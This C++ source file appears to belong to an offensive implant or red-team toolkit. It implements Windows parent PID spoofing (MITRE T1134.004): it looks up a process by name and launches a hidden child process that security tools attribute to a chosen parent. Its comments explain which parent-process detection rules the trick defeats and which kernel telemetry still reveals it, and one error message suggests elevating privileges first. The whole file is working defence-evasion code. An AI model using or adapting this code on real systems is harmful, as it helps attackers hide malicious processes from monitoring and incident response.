#include "PPIDSpoof.h"
#include <tlhelp32.h>

// ── Find PID by name ───────────────────────────────────────────────────────────

DWORD PPIDSpoof::FindPid(const std::string& procName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, procName.c_str()) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

// ── PPID-spoofed process creation ─────────────────────────────────────────────
// Uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to set an arbitrary PPID.
// In Task Manager, Process Explorer, and most SIEMs the child's parent column
// will show parentPid's executable — not ours.
//
// Detection layer 1 (defeats): parent-process anomaly detection rules
//   (e.g. "cmd.exe parent not in {explorer.exe, powershell.exe, ...}")
// Detection layer 2 (survives): kernel-level ETW/callbacks track the REAL creator PID,
//   so Sysmon with KernelCallbackTable monitoring and some EDRs can still spot the spoof.
// MITRE T1134.004 — Parent PID Spoofing.

std::string PPIDSpoof::Spawn(DWORD parentPid, const std::string& cmdLine) {
    if (parentPid == 0)
        return "ppidspoof: invalid parent PID";

    // Open the desired parent process with PROCESS_CREATE_PROCESS right
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (!hParent)
        return "ppidspoof: OpenProcess(" + std::to_string(parentPid) +
               ") failed err=" + std::to_string(GetLastError()) +
               " (try a lower-integrity parent or elevate first)";

    // Build the attribute list with parent override
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    std::vector<BYTE> attrBuf(attrSize);
    LPPROC_THREAD_ATTRIBUTE_LIST pAttr = (LPPROC_THREAD_ATTRIBUTE_LIST)attrBuf.data();

    if (!InitializeProcThreadAttributeList(pAttr, 1, 0, &attrSize)) {
        CloseHandle(hParent);
        return "ppidspoof: InitializeProcThreadAttributeList failed";
    }

    if (!UpdateProcThreadAttribute(pAttr, 0,
                                   PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                   &hParent, sizeof(hParent), NULL, NULL)) {
        DeleteProcThreadAttributeList(pAttr);
        CloseHandle(hParent);
        return "ppidspoof: UpdateProcThreadAttribute failed err=" +
               std::to_string(GetLastError());
    }

    STARTUPINFOEXA siex = {};
    siex.StartupInfo.cb      = sizeof(siex);
    siex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    siex.StartupInfo.wShowWindow = SW_HIDE;
    siex.lpAttributeList = pAttr;

    std::string cmdLineCopy = cmdLine;  // CreateProcess requires writable buffer

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessA(
        NULL, &cmdLineCopy[0],
        NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL,
        (STARTUPINFOA*)&siex, &pi);

    DeleteProcThreadAttributeList(pAttr);
    CloseHandle(hParent);

    if (!ok)
        return "ppidspoof: CreateProcess failed err=" + std::to_string(GetLastError());

    DWORD childPid = pi.dwProcessId;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return "ppidspoof: spawned '" + cmdLine +
           "' PID=" + std::to_string(childPid) +
           " with spoofed PPID=" + std::to_string(parentPid) +
           "\nIn Task Manager/Sysmon the parent will appear as PID " +
           std::to_string(parentPid) + " instead of this process.";
}
